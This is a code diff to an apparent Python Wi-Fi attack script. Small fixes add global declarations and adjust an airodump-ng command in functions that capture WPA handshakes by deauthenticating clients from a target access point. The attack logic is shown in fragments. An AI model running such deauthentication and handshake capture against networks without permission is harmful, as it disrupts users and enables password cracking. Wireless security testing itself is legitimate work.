@@ -279,14 +279,15 @@ def getInterfaceName():
 
 def captureHandshake():
 	global routerBSSID
+	global interfaceName
 
 	clientBSSID = scanClientsForAccessPoint()
 	airodump_proc = bash_command("airodump-ng" +
 			" -c " + str(channel) +
 			" --bssid " + str(routerBSSID) +
 			" --output-format cap" +
-			" -w " + packetPath + "packet " +
-			str(interfaceName))
+			" -w " + packetPath + "packet" +
+			" " + str(interfaceName))
 	time.sleep(2)
 	deauthenticateClient(clientBSSID)
 	time.sleep(8)
@@ -296,6 +297,7 @@ def captureHandshake():
 def scanClientsForAccessPoint(routerESSID=None):
 	global routerBSSID
 	global channel
+	global interfaceName
 
 	print("Using interface: " + interfaceName)
 
@@ -329,7 +331,10 @@ def scanClientsForAccessPoint(routerESSID=None):
 
 
 def deauthenticateClient(clientBSSID, routerESSID=None):
-	global routerBSSID, interfaceName, channel
+	global routerBSSID
+	global interfaceName
+	global channel
+
 	if routerESSID == None or routerESSID == '':
 		print("Deauthenticating client " + clientBSSID + " at AP " + routerBSSID)
 	else:
